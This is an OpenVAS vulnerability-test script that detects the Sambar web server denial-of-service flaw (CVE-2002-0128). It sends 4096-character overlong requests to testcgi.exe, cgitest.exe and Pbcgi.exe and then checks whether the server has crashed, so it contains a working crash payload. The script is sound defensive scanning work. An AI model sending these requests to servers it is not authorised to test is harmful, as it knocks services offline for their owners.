###############################################################################
# OpenVAS Vulnerability Test
# $Id: sambar_DoS.nasl 5134 2017-01-30 08:20:15Z cfi $
#
# Sambar web server DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11131");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(3885);
  script_name("Sambar web server DOS");
  script_cve_id("CVE-2002-0128");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("www/sambar");

  script_tag(name:"impact", value:"An attacker may use this flaw to make your server crash
  continuously, preventing you from working properly.");

  script_tag(name:"solution", value:"Upgrade your server to Sambar 51p or delete those CGI.");

  script_tag(name:"summary", value:"It is possible to kill the Sambar web server 'server.exe'
  by sending it a long request like:

  - /cgi-win/testcgi.exe?XXXX...X

  - /cgi-win/cgitest.exe?XXXX...X

  - /cgi-win/Pbcgi.exe?XXXXX...X (or maybe in /cgi-bin/)");

  script_tag(name:"affected", value:"Sambar WebServer v5.1.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

port = get_http_port( default:80 );
if( http_is_dead( port:port ) )
  exit( 0 );

function test_port( port, cgi ) {
  url = string( cgi, "?", crap( 4096 ) );
  req = http_get( item:url, port:port );
  res = http_send_recv( port:port, data:req );
  if( isnull ( res ) ) return TRUE;
  else return FALSE;
}

# The advisories are not clear: is this cgitest.exe or testcgi.exe?
# Is it in cgi-bin or cgi-win?
foreach dir( make_list( "/cgi-bin", "/cgi-win" ) ) {
  foreach file( make_list( "/cgitest.exe", "/testcgi.exe", "/Pbcgi.exe" ) ) {
    if( test_port( port:port, cgi:dir + file ) ) {
      # If we fail on the first connection, this means the server is already dead
      break;
    }
  }
}

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );